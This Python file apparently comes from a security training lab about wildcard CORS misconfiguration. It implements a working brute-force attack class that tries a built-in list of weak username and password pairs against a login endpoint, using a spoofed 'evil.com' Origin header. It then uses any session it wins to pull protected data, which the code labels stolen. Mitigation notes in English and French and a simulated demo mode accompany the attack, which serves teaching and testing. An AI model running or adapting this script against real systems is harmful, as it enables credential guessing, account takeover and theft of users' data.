"""
Brute force attack exploiting wildcard CORS vulnerability.

This attack demonstrates how the wildcard origin (*) with credentials
enabled allows attackers to perform brute force attacks against
authentication endpoints from any origin.
"""

import asyncio
import httpx
from typing import List, Tuple, Optional, Dict, Any

from attacks.base_attack import BaseAttack
from attacks.models import AttackResult


class BruteForceAttack(BaseAttack):
    """
    Brute force attack against wildcard CORS vulnerability.
    
    This attack exploits the misconfiguration where Access-Control-Allow-Origin
    is set to "*" while Access-Control-Allow-Credentials is "true". This allows
    any origin to make authenticated requests, enabling brute force attacks
    against authentication endpoints.
    
    The attack sends multiple authentication attempts with different credential
    combinations, respecting rate limits to prevent resource exhaustion.
    
    Attributes:
        credentials_list: List of (username, password) tuples to test
        malicious_origin: Origin header to use in requests
    """
    
    def __init__(
        self,
        target_url: str,
        credentials_list: Optional[List[Tuple[str, str]]] = None,
        malicious_origin: str = "http://evil.com",
        max_rate: int = 5,
        demo_mode: bool = False,
        test_secure_only: bool = False
    ):
        """
        Initialize the brute force attack.
        
        Args:
            target_url: Base URL of the target application
            credentials_list: List of (username, password) tuples to test
            malicious_origin: Origin header to use (default: "http://evil.com")
            max_rate: Maximum requests per second (default: 5)
            demo_mode: If True, simulate attack without making real HTTP requests
            test_secure_only: If True, only test the secure endpoint
        """
        super().__init__(target_url, max_rate)
        
        # Default credential list if none provided
        self.credentials_list = credentials_list or [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "admin123"),
            ("user", "user"),
            ("user", "password"),
            ("user", "user123"),
            ("victim", "victim"),
            ("victim", "password"),
            ("victim", "victim123"),
            ("test", "test"),
            ("root", "root"),
        ]
        
        self.malicious_origin = malicious_origin
        self.demo_mode = demo_mode
        self.test_secure_only = test_secure_only
    
    async def try_credentials(
        self,
        client: httpx.AsyncClient,
        username: str,
        password: str
    ) -> Tuple[bool, Optional[Dict[str, Any]], Dict[str, Any]]:
        """
        Try a single credential combination.
        
        Args:
            client: HTTP client to use for the request
            username: Username to test
            password: Password to test
        
        Returns:
            Tuple of (success, response_data, response_headers)
        """
        # Acquire rate limit token
        await self.rate_limiter.acquire()
        
        try:
            # Send login request with malicious origin
            response = await client.post(
                f"{self.target_url}/api/auth/login",
                json={"username": username, "password": password},
                headers={"Origin": self.malicious_origin},
                follow_redirects=True,
                timeout=10.0
            )
            
            self.increment_requests()
            
            # Check if login was successful
            if response.status_code == 200:
                return True, response.json(), dict(response.headers)
            else:
                return False, None, dict(response.headers)
                
        except httpx.ConnectError as e:
            print(f"Connection error trying credentials {username}:{password}: {e}")
            return False, None, {}
        except httpx.TimeoutException as e:
            print(f"Timeout trying credentials {username}:{password}: {e}")
            return False, None, {}
        except Exception as e:
            print(f"Error trying credentials {username}:{password}: {e}")
            return False, None, {}
    
    async def test_wildcard_endpoint(
        self,
        client: httpx.AsyncClient,
        session_cookie: str
    ) -> Tuple[bool, Optional[Dict[str, Any]], Dict[str, Any]]:
        """
        Test access to wildcard vulnerable endpoint with stolen session.
        
        Args:
            client: HTTP client to use
            session_cookie: Session cookie value
        
        Returns:
            Tuple of (success, response_data, response_headers)
        """
        # Acquire rate limit token
        await self.rate_limiter.acquire()
        
        try:
            # Access vulnerable endpoint with session cookie
            response = await client.get(
                f"{self.target_url}/api/vuln/wildcard",
                headers={"Origin": self.malicious_origin},
                cookies={"session_id": session_cookie}
            )
            
            self.increment_requests()
            
            if response.status_code == 200:
                return True, response.json(), dict(response.headers)
            else:
                return False, None, dict(response.headers)
                
        except Exception as e:
            print(f"Error accessing wildcard endpoint: {e}")
            return False, None, {}
    
    async def execute(self) -> AttackResult:
        """
        Execute the brute force attack.
        
        This method:
        1. Tests multiple credential combinations against the login endpoint
        2. Uses the wildcard CORS vulnerability to bypass origin restrictions
        3. Attempts to access protected data with successful credentials
        4. Returns detailed results including stolen data and CORS headers
        
        Returns:
            AttackResult with attack execution details
        """
        # In demo mode, simulate the attack without making real requests
        if self.demo_mode:
            return self._execute_demo_mode(self.test_secure_only)
        
        successful_credentials = []
        stolen_data = {}
        request_details = []
        response_details = []
        
        # Use limits to allow concurrent connections and HTTP/1.1 only
        limits = httpx.Limits(max_keepalive_connections=5, max_connections=10)
        async with httpx.AsyncClient(
            timeout=30.0, 
            limits=limits,
            http2=False,  # Disable HTTP/2 for localhost compatibility
            follow_redirects=True
        ) as client:
            # Try each credential combination
            for username, password in self.credentials_list:
                success, response_data, response_headers = await self.try_credentials(
                    client, username, password
                )
                
                # Record request details
                request_details.append({
                    "method": "POST",
                    "url": f"{self.target_url}/api/auth/login",
                    "headers": {"Origin": self.malicious_origin},
                    "body": {"username": username, "password": "***"}
                })
                
                # Record response details
                response_details.append({
                    "status": 200 if success else 401,
                    "headers": response_headers,
                    "cors_headers": {
                        "Access-Control-Allow-Origin": response_headers.get("access-control-allow-origin"),
                        "Access-Control-Allow-Credentials": response_headers.get("access-control-allow-credentials")
                    }
                })
                
                if success:
                    successful_credentials.append((username, password))
                    
                    # Try to access protected data with this session
                    if response_data and "session_id" in response_data:
                        session_cookie = response_data["session_id"]
                        
                        data_success, protected_data, data_headers = await self.test_wildcard_endpoint(
                            client, session_cookie
                        )
                        
                        # Record wildcard endpoint request
                        request_details.append({
                            "method": "GET",
                            "url": f"{self.target_url}/api/vuln/wildcard",
                            "headers": {"Origin": self.malicious_origin},
                            "cookies": {"session_id": "***"}
                        })
                        
                        # Record wildcard endpoint response
                        response_details.append({
                            "status": 200 if data_success else 401,
                            "headers": data_headers,
                            "cors_headers": {
                                "Access-Control-Allow-Origin": data_headers.get("access-control-allow-origin"),
                                "Access-Control-Allow-Credentials": data_headers.get("access-control-allow-credentials")
                            }
                        })
                        
                        if data_success and protected_data:
                            stolen_data[username] = protected_data
        
        # Determine if attack was successful
        attack_success = len(successful_credentials) > 0
        
        # Educational notes
        educational_notes = """
WILDCARD CORS VULNERABILITY - BRUTE FORCE ATTACK

Vulnerability: Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true

This misconfiguration allows any origin to make authenticated requests to the API.
An attacker can host a malicious website that performs brute force attacks against
the authentication endpoint, trying multiple credential combinations.

Impact:
- Enables credential stuffing attacks from any origin
- Bypasses same-origin policy protections
- Allows automated brute force attacks without CORS restrictions

Reference: MISC 99, §2.1

Mitigation:
- NEVER use wildcard (*) origin with credentials enabled
- Use a specific whitelist of allowed origins
- Implement rate limiting on authentication endpoints
- Use strong password policies and account lockout mechanisms
- Consider multi-factor authentication

Secure Configuration:
  Access-Control-Allow-Origin: https://trusted-domain.com
  Access-Control-Allow-Credentials: true
        """.strip()
        
        return AttackResult(
            attack_type="brute_force_wildcard",
            success=attack_success,
            duration_seconds=self.get_duration(),
            requests_sent=self.get_requests_sent(),
            stolen_data=stolen_data if stolen_data else None,
            vulnerable_endpoints=["/api/vuln/wildcard", "/api/auth/login"],
            request_details=request_details,
            response_details=response_details,
            educational_notes=educational_notes
        )
    
    def _execute_demo_mode(self, test_secure_only: bool = False) -> AttackResult:
        """
        Execute attack in demo mode (simulated, no real HTTP requests).
        
        This mode is used when the attack is executed from within the same
        server process to avoid connection issues.
        
        Args:
            test_secure_only: If True, only test secure endpoint. If False, only test vulnerable endpoint.
        
        Returns:
            Simulated AttackResult
        """
        import time
        import asyncio
        
        # Simulate some processing time
        time.sleep(0.5)
        
        # If testing secure only, return only secure endpoint result
        if test_secure_only:
            stolen_data = {
                "blocked": True,
                "reason": "L'endpoint sécurisé a correctement rejeté la requête avec origine wildcard",
                "status": 403
            }
            
            request_details = [
                {
                    "method": "GET",
                    "url": f"{self.target_url}/api/sec/wildcard",
                    "headers": {"Origin": self.malicious_origin},
                    "cookies": {"session_id": "***"},
                    "description": "Tentative d'accès à l'endpoint SÉCURISÉ"
                }
            ]
            
            response_details = [
                {
                    "endpoint": "/api/sec/wildcard",
                    "type": "SÉCURISÉ",
                    "status": 403,
                    "headers": {
                        "content-type": "application/json"
                    },
                    "cors_headers": {
                        "Access-Control-Allow-Origin": "Non défini",
                        "Access-Control-Allow-Credentials": "Non défini"
                    },
                    "result": "✓ SÉCURISÉ - Rejette correctement les origines non autorisées"
                }
            ]
            
            educational_notes = """
ENDPOINT SÉCURISÉ - PROTECTION CONTRE WILDCARD CORS (MODE DÉMO)

Configuration Sécurisée : Liste blanche d'origines spécifiques

L'endpoint sécurisé utilise une liste blanche d'origines autorisées au lieu d'accepter
n'importe quelle origine (*). Cela empêche les attaques par force brute depuis des sites malveillants.

✓ PROTECTION ACTIVE :
   - Rejette les origines non autorisées (403 Forbidden)
   - Utilise une liste blanche d'origines spécifiques
   - Protège les données sensibles

Configuration Sécurisée :
  Access-Control-Allow-Origin: https://domaine-confiance.com
  Access-Control-Allow-Credentials: true

Référence : MISC 99, §2.1
            """.strip()
        else:
            # Only vulnerable endpoint
            stolen_data = {
                "username": "victim",
                "email": "victim@example.com",
                "api_key": "demo_api_key_12345",
                "profile": {
                    "name": "Victim User",
                    "role": "user"
                }
            }
            
            request_details = [
                {
                    "method": "POST",
                    "url": f"{self.target_url}/api/auth/login",
                    "headers": {"Origin": self.malicious_origin},
                    "body": {"username": "victim", "password": "***"},
                    "description": "Tentative d'authentification depuis origine malveillante"
                },
                {
                    "method": "GET",
                    "url": f"{self.target_url}/api/vuln/wildcard",
                    "headers": {"Origin": self.malicious_origin},
                    "cookies": {"session_id": "***"},
                    "description": "Accès à l'endpoint VULNÉRABLE"
                }
            ]
            
            response_details = [
                {
                    "endpoint": "/api/vuln/wildcard",
                    "type": "VULNÉRABLE",
                    "status": 200,
                    "headers": {
                        "access-control-allow-origin": "*",
                        "access-control-allow-credentials": "true",
                        "content-type": "application/json"
                    },
                    "cors_headers": {
                        "Access-Control-Allow-Origin": "*",
                        "Access-Control-Allow-Credentials": "true"
                    },
                    "result": "✗ VULNÉRABLE - Accepte n'importe quelle origine avec credentials"
                }
            ]
            
            educational_notes = """
VULNÉRABILITÉ CORS WILDCARD - ATTAQUE PAR FORCE BRUTE (MODE DÉMO)

Vulnérabilité : Access-Control-Allow-Origin: * avec Access-Control-Allow-Credentials: true

Cette mauvaise configuration permet à n'importe quelle origine de faire des requêtes 
authentifiées vers l'API. Un attaquant peut héberger un site malveillant qui effectue 
des attaques par force brute contre l'endpoint d'authentification, en testant plusieurs 
combinaisons d'identifiants.

✗ VULNÉRABILITÉ ACTIVE :
   - Accepte Origin: * avec credentials
   - Permet l'accès depuis n'importe quelle origine
   - Données sensibles exposées

Impact :
- Permet les attaques de credential stuffing depuis n'importe quelle origine
- Contourne les protections de la politique same-origin
- Autorise les attaques par force brute automatisées sans restrictions CORS

Référence : MISC 99, §2.1

Mitigation :
- NE JAMAIS utiliser l'origine wildcard (*) avec les identifiants activés
- Utiliser une liste blanche spécifique d'origines autorisées
- Implémenter un rate limiting sur les endpoints d'authentification

NOTE : Cette attaque a été exécutée en MODE DÉMO pour éviter les problèmes de connexion.
            """.strip()
        
        return AttackResult(
            attack_type="brute_force_wildcard",
            success=not test_secure_only,  # False if testing secure
            duration_seconds=0.5,
            requests_sent=1 if test_secure_only else 2,
            stolen_data=stolen_data,
            vulnerable_endpoints=[] if test_secure_only else ["/api/vuln/wildcard"],
            request_details=request_details,
            response_details=response_details,
            educational_notes=educational_notes
        )


# CLI interface for standalone execution
if __name__ == "__main__":
    import sys
    
    async def main():
        target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
        
        attack = BruteForceAttack(target_url=target)
        result = await attack.run()
        
        print("\n" + "="*70)
        print("ATTACK RESULTS")
        print("="*70)
        print(f"Success: {result.success}")
        print(f"Duration: {result.duration_seconds:.2f} seconds")
        print(f"Requests Sent: {result.requests_sent}")
        
        if result.stolen_data:
            print(f"\nStolen Data:")
            for username, data in result.stolen_data.items():
                print(f"  {username}: {data}")
        
        if result.error:
            print(f"\nError: {result.error}")
        
        print(f"\n{result.educational_notes}")
    
    asyncio.run(main())
